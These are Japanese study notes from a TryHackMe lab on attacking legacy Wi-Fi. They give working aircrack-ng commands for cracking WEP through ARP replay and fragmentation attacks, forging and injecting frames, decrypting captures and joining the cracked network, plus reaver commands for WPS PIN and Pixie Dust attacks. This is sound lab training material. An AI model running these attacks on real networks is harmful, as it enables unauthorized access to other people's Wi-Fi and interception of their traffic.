# WEP

https://tryhackme.com/room/attackinglegacywifi

## APRリプレイ攻撃

通常、WEPの暗号を解読するには数万〜数十万個のパケットを集める必要があるが、普通に待っていると非常に時間がかかる。下記のコマンドを使うことで、ルーターから大量のパケットを無理やり吐き出させ、数分〜数十分という短時間で解読に必要なデータを集めることができる。

### キャプチャ開始（起動しっぱなし）

```sh
sudo airodump-ng -c 3 --bssid F0:9F:C2:71:22:11 -w wep wlan0mon
```

### 擬似認証（Fake Authentication）

ターゲットの無線ルーター（アクセスポイント）に対して、自分の無線アダプターが「正しく接続されている（認証された）状態」に見せかけるための準備。

```sh
sudo aireplay-ng -1 0 -a F0:9F:C2:71:22:11 -h 02:00:00:00:00:00 wlan0mon
```

### ARPリプレイ

ターゲットのネットワーク上でやり取りされるARPリクエスト（通信要求パケット）をキャプチャして大量にルーターへ送り直し、ルーターに膨大な暗号化パケット（IV）を強制的に生成させる。５，６万パケット程度送信したらプロセスを切る。

```sh
sudo aireplay-ng -3 -b F0:9F:C2:71:22:11 -h 02:00:00:00:00:00 wlan0mon
```

### WEPキーの復元

単語リストは不要。

```sh
sudo aircrack-ng -b F0:9F:C2:71:22:11 wep-01.cap
```

下記のように、秘密鍵がコロン区切りのバイトで出力される。下記の例では5バイト＝40ビットの秘密鍵。IVが24ビットのため、64ビットWEPとなる。

```sh
             KEY FOUND! [ 11:BB:33:CD:55 ] 
	Decrypted correctly: 100%
```

### 復号

```sh
# wep-03-dec.cap が生成される。
airdecap-ng -e F0:9F:C2:71:22:11 -w 11BB33CD55 wep-03.cap
```

## フラグメンテーション攻撃

暗号の鍵（キーストリーム）を解析するために必要な「PRGA（疑似乱数生成器のデータ）」を、パケットを断片化（フラグメント）させることで強制的に生成・抽出する手法。

フラグメンテーション攻撃は本物のARPパケットが流れていなくても、自力で暗号解析用のデータを生み出せる。

### 疑似認証

```sh
sudo aireplay-ng -1 0 -a F0:9F:C2:71:22:11 -h 02:00:00:00:00:00 wlan0mon
```

### フラグメンテーション攻撃

```sh
user@debian-thm:~$ sudo aireplay-ng -5 -b F0:9F:C2:71:22:11 -h 02:00:00:00:00:00 wlan0mon
Use this packet ? y
Saving chosen packet in replay_src-1019-100126.cap
```

### フレームを鍛造(Forging a Frame)

```sh
sudo packetforge-ng -0 -a F0:9F:C2:71:22:11 -h 02:00:00:00:00:00 -k 255.255.255.255 -l 192.168.1.100 -y fragment-1019-100126.xor -w forge-arp.cap
```

### 鍛造したフレームを注入

```sh
# キャプチャ開始
sudo airodump-ng -c 3 --bssid F0:9F:C2:71:22:11 -w frag2 wlan0mon
```

```sh
# 数万件のフレームを送信
sudo aireplay-ng -2 -F -r forge-arp.cap -x 800 wlan0mon
```

### キーの復元

```sh
sudo aircrack-ng -b F0:9F:C2:71:22:11 frag2-01.cap
```

## カフェラテ攻撃

不正APにクライアントから接続させてキーを得る攻撃。

https://tryhackme.com/room/attackinglegacywifi?taskNo=7&sharerId=674ed42e2374d1bc93db444c

## WEPネットワークへの接続

homelegacy.conf。WEPはkey_mgmtがNONE。

```sh
network={
    ssid="Home-Legacy"
    key_mgmt=NONE
    wep_key0=11BB33CD55
    wep_tx_keyidx=0
}
```

```sh
sudo wpa_supplicant -B -i wlan1 -c homelegacy.conf
sudo iw dev wlan1 link
```

```sh
sudo dhclient -v wlan1
```

## PIN攻撃

Wi-Fi Protected Setup (WPS) は、パスフレーズを完全にバイパスする、ネットワークへの2つ目の接続方法。ユーザーはルーターに印刷されている短い8桁のPINを入力して接続し、アクセスポイントはPINが検証されると実際のパスフレーズを提供する。

```sh
# -K は、Pixie Dust攻撃の有効化
sudo reaver -i wlan0mon -b F0:9F:C2:71:22:13 -c 8 -K -vv

# ブルートフォース（現実的ではない）
sudo reaver -i wlan0mon -b F0:9F:C2:71:22:13 -c 8 -vv
```

接続

```sh
sudo pkill -f 'wpa_supplicant.*wlan1'
wpa_passphrase Event-WiFi 'password' > event.conf
sudo wpa_supplicant -B -i wlan1 -c event.conf
sudo dhclient -v wlan1
```
